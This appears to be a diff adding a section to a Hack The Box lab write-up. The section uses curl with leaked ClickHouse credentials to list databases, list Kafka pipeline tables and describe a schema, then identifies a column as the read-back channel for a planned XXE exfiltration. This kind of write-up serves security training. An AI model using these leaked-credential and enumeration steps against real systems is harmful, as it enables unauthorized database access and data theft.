@@ -654,6 +654,99 @@ ClickHouse runs a query passed in the `query` parameter and authenticates with H
 ```
 
 Key finding: the credential is valid on ClickHouse. The leaked gateway datasource account grants authenticated SQL access to the pipeline's database, the channel used later to read back exfiltrated data.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### 2.6 ClickHouse Pipeline Enumeration
+
+Authenticated access is confirmed. Map the database, its tables, and the destination schema to understand how ingested XML becomes queryable rows, which is what the exfiltration will exploit.
+
+#### 2.6.1 List databases
+
+Enumerate what this account can see.
+
+**Command:** `curl -sG http://db.htb-airport.htb/ -u 'svc_events:Yl4aCgh4y2PnU' --data-urlencode 'query=SHOW DATABASES'`
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `curl -sG` | GET with params | Sends a GET and appends `--data-urlencode` values as the query string, so spaces in SQL are encoded automatically. |
+| `--data-urlencode 'query=SHOW DATABASES'` | SQL over HTTP | Runs `SHOW DATABASES`, URL-encoding it for you. |
+| `-u 'svc_events:...'` | Basic auth | Authenticates as the leaked account. |
+
+**Result:**
+
+```shell
+partner_feed
+```
+
+Only `partner_feed` is visible; the account's grants hide ClickHouse's `system` databases. The pipeline data lives here.
+
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+#### 2.6.2 List tables
+
+Enumerate the tables inside `partner_feed`.
+
+**Command:** `curl -sG http://db.htb-airport.htb/ -u 'svc_events:Yl4aCgh4y2PnU' --data-urlencode 'query=SHOW TABLES FROM partner_feed'`
+
+**Result:**
+
+```shell
+flightleg_json
+flightleg_json_kafka
+flightleg_json_mv
+flightleg_raw
+flightleg_raw_kafka
+flightleg_raw_mv
+```
+
+Key finding: a standard Kafka-to-ClickHouse pipeline in two families (`raw` and `json`). The `_kafka` tables consume a Kafka topic, the `_mv` materialized views transform and move rows, and the plain `flightleg_json` / `flightleg_raw` tables are the destinations. XML submitted to the ingest API flows through Kafka, gets parsed by a view, and lands in `flightleg_json`.
+
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+#### 2.6.3 Describe the parsed destination table
+
+Read the column layout of `flightleg_json` to find a submission anchor and a field that holds parsed XML content.
+
+**Command:** `curl -sG http://db.htb-airport.htb/ -u 'svc_events:Yl4aCgh4y2PnU' --data-urlencode 'query=DESCRIBE TABLE partner_feed.flightleg_json'`
+
+**Result:**
+
+```shell
+transaction_id  String
+originator      String
+message_type    String
+version String
+msg_timestamp   String
+airline String
+flight_number   String
+departure_airport       String
+arrival_airport String
+origin_date     String
+repeat_number   String
+operational_status      String
+event   String
+ingested        DateTime        DEFAULT now()
+```
+
+Key finding: every field is `String`. `transaction_id` is the anchor, set from the XML `TransactionIdentifier`, so each submission can be queried back by its own id. `airline` holds a parsed element value, making it the column an external-entity payload will populate. This schema is the read-back channel for the XXE.
+
 
 
 
